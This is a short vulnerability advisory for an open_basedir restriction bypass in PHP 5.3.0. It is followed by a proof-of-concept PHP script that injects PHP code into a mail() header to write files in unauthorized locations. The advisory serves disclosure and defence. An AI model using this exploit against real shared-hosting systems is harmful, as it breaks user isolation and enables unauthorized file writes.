source: http://www.securityfocus.com/bid/36007/info

PHP is prone to an 'open_basedir' restriction-bypass vulnerability because of a design error.

Successful exploits could allow an attacker to write files in unauthorized locations.

This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code; in such cases, the 'safe_mode' and 'open_basedir' restrictions are expected to isolate users from each other.

PHP 5.3.0 is vulnerable. 

<?php
$to = 'stop@example.com';
$subject = 'open_basedir bypass by http://securityreason.com';
$message = 'exploit';
$headers = 'From: stop@example.com' . "\r\n" .
'Reply-To: stop@example.com' . "\r\n" .
'X-Mailer: PHP<?php echo ini_get(\'open_basedir\');?>/' .
phpversion();

mail($to, $subject, $message, $headers);
?>